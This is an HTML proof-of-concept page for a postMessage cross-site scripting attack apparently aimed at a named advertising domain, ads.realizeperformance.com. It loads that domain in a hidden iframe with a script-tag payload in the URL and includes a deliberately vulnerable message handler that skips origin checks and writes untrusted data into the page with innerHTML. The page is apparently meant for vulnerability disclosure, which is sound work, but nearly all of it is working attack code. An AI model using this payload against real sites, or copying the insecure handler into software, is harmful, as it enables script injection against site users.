<!DOCTYPE html>
<html>
  <head>
    <title>PoC: PostMessage XSS via RealizePerformance</title>
  </head>
  <body>
    <h2>Malicious Parent</h2>
    <iframe src="https://ads.realizeperformance.com/anypage?x=<script>alert('XSS')</script>"
            width="0" height="0" style="display:none" id="evilFrame">
    </iframe>

    <script>
      // Vulnerable message handler (simulating what a real site might do)
      window.addEventListener("message", function(event) {
        // ❌ NO origin validation
        if (event.data && typeof event.data === "object" && event.data.value) {
          // ❌ Injects location.href directly into the DOM => XSS
          document.body.innerHTML += "<h3>Injected URL:</h3>" + event.data.value;
        }
      });
    </script>
  </body>
</html>
